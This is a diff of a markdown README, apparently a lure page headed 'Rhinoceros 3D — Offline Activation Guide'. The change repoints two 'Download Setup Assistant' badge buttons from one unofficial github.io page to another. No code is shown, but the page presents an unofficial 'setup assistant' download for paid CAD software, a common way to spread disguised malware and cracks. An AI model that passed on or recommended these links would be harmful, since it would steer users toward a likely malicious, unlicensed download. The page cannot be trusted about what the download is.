@@ -1,6 +1,6 @@
 # Rhinoceros 3D — Offline Activation Guide
 
-[![💾 Download Setup Assistant](https://img.shields.io/badge/%F0%9F%92%BE-Download_Setup_Assistant-%23E60026?style=for-the-badge&logo=rhino)](https://ryadikmntiiks.github.io/.github/RHI3d)
+[![💾 Download Setup Assistant](https://img.shields.io/badge/%F0%9F%92%BE-Download_Setup_Assistant-%23E60026?style=for-the-badge&logo=rhino)](https://rhinoceros-software-download.github.io/.github)
 
 ---
 
@@ -36,7 +36,7 @@
 ![Complex 3D Surface Model](https://th.bing.com/th/id/OIP.Mlo1vKqMUe-ufFYYe78oHgHaEK?o=7rm=3&rs=1&pid=ImgDetMain&cb=idpwebpc2)  
 *Detailed parametric geometry created using Rhino 3D*
 
-[![💾 Download Setup Assistant](https://img.shields.io/badge/%F0%9F%92%BE-Download_Setup_Assistant-%23E60026?style=for-the-badge&logo=rhino)](https://ryadikmntiiks.github.io/.github/RHI3d)
+[![💾 Download Setup Assistant](https://img.shields.io/badge/%F0%9F%92%BE-Download_Setup_Assistant-%23E60026?style=for-the-badge&logo=rhino)](https://rhinoceros-software-download.github.io/.github)
 
 ---
 
